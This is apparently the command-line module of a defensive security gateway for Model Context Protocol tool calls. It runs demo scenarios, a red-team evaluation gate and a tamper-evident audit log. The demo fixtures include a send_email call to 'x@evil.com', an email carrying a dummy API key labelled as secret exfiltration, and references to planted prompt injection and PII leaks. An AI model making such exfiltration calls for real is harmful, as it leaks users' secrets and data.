"""Command line interface: demo, probe, eval, audit, serve."""

from __future__ import annotations

import argparse
import sys
from pathlib import Path

from rich.console import Console
from rich.table import Table

from mcp_guardrail.audit import AuditLog
from mcp_guardrail.config import default_policy, load_policy
from mcp_guardrail.evals import render_markdown, run_eval
from mcp_guardrail.gateway import Gateway

console = Console()

_DEMO_CALLS = [
    ("analyst", "read_file", {"path": "/company/handbook.txt"}, "benign read"),
    ("analyst", "read_file", {"path": "/company/notes.txt"}, "file with a planted injection"),
    ("analyst", "query_db", {"sql": "SELECT id, name, email, phone FROM customers"}, "PII in the result"),
    ("analyst", "fetch_url", {"url": "https://docs.company.com/leaky"}, "leaked secret on a page"),
    ("analyst", "send_email", {"to": "x@evil.com", "body": "data"}, "role not permitted"),
    ("admin", "send_email", {"to": "ops@company.com", "body": "key sk-abc123THISKEYSHOULDNEVERLEAK4567"}, "secret exfiltration"),
]


def _policy(args: argparse.Namespace):
    return load_policy(args.policy) if getattr(args, "policy", None) else default_policy()


def cmd_demo(args: argparse.Namespace) -> int:
    gw = Gateway(_policy(args))
    table = Table(title="Gateway demo", show_lines=False)
    table.add_column("role")
    table.add_column("tool")
    table.add_column("scenario")
    table.add_column("verdict")
    table.add_column("result (sanitized)", overflow="fold")
    for role, tool, tool_args, scenario in _DEMO_CALLS:
        out = gw.call(role, tool, tool_args)
        verdict = "allowed" if out.allowed else "blocked"
        note = []
        if out.redacted:
            note.append(f"{out.redacted} redacted")
        if out.neutralized:
            note.append(f"{out.neutralized} neutralized")
        verdict = verdict + (f" ({', '.join(note)})" if note else "")
        table.add_row(role, tool, scenario, verdict, out.text[:80])
    console.print(table)
    console.print(f"audit chain verified: {gw.audit.verify()} ({len(gw.audit)} entries)")
    return 0


def cmd_probe(args: argparse.Namespace) -> int:
    tool_args = dict(kv.split("=", 1) for kv in args.arg)
    gw = Gateway(_policy(args))
    out = gw.call(args.role, args.tool, tool_args)
    console.print(f"[bold]{'ALLOWED' if out.allowed else 'BLOCKED'}[/bold]  role={args.role} tool={args.tool}")
    console.print(f"reasons: {', '.join(out.reasons)}")
    console.print(f"findings: {out.findings}  redacted={out.redacted}  neutralized={out.neutralized}")
    console.print(f"result: {out.text}")
    return 0


def cmd_eval(args: argparse.Namespace) -> int:
    report = run_eval()
    d = report.as_dict()
    table = Table(title="Red-team gate")
    table.add_column("metric")
    table.add_column("value")
    table.add_column("gate")
    table.add_row("unsafe_allowed", str(d["unsafe_allowed"]), "= 0")
    table.add_row("pii_secret_leaks", str(d["pii_secret_leaks"]), "= 0")
    table.add_row("injection_survivors", str(d["injection_survivors"]), "= 0")
    table.add_row("injection_neutralized_rate", str(d["injection_neutralized_rate"]), ">= 0.9")
    table.add_row("false_positive_rate", str(d["false_positive_rate"]), "<= 0.1")
    console.print(table)
    if args.report:
        Path(args.report).parent.mkdir(parents=True, exist_ok=True)
        Path(args.report).write_text(render_markdown(report))
        console.print(f"wrote {args.report}")
    if report.passed:
        console.print("[bold green]gate: PASS[/bold green]")
        return 0
    console.print("[bold red]gate: FAIL[/bold red]")
    return 1


def cmd_audit(args: argparse.Namespace) -> int:
    gw = Gateway(_policy(args), audit=AuditLog())
    for role, tool, tool_args, _ in _DEMO_CALLS:
        gw.call(role, tool, tool_args)
    table = Table(title="Audit chain (tamper-evident)")
    table.add_column("#")
    table.add_column("role")
    table.add_column("tool")
    table.add_column("action")
    table.add_column("hash (head)")
    for i, e in enumerate(gw.audit.entries):
        table.add_row(str(i), e.role, e.tool, e.action, e.entry_hash[:12])
    console.print(table)
    console.print(f"chain verified: {gw.audit.verify()}")
    return 0


def cmd_serve(args: argparse.Namespace) -> int:
    try:
        from mcp_guardrail.server import build_server
    except ImportError:
        console.print("install the transport first: pip install '.[mcp]'")
        return 1
    build_server(role=args.role, policy=_policy(args)).run()
    return 0


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(prog="gateway", description="Security gateway for the Model Context Protocol.")
    parser.add_argument("--policy", help="path to a policy YAML (defaults to the built-in policy)")
    sub = parser.add_subparsers(dest="command", required=True)

    sub.add_parser("demo", help="run a narrated set of representative calls")

    p_probe = sub.add_parser("probe", help="send a single call through the gateway")
    p_probe.add_argument("--role", default="analyst")
    p_probe.add_argument("--tool", required=True)
    p_probe.add_argument("--arg", action="append", default=[], help="key=value (repeatable)")

    p_eval = sub.add_parser("eval", help="run the red-team gate")
    p_eval.add_argument("--report", default="reports/security_report_example.md")

    sub.add_parser("audit", help="show and verify the audit chain")

    p_serve = sub.add_parser("serve", help="run the live MCP server over stdio")
    p_serve.add_argument("--role", default="analyst")
    return parser


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    handlers = {
        "demo": cmd_demo,
        "probe": cmd_probe,
        "eval": cmd_eval,
        "audit": cmd_audit,
        "serve": cmd_serve,
    }
    return handlers[args.command](args)


if __name__ == "__main__":
    sys.exit(main())
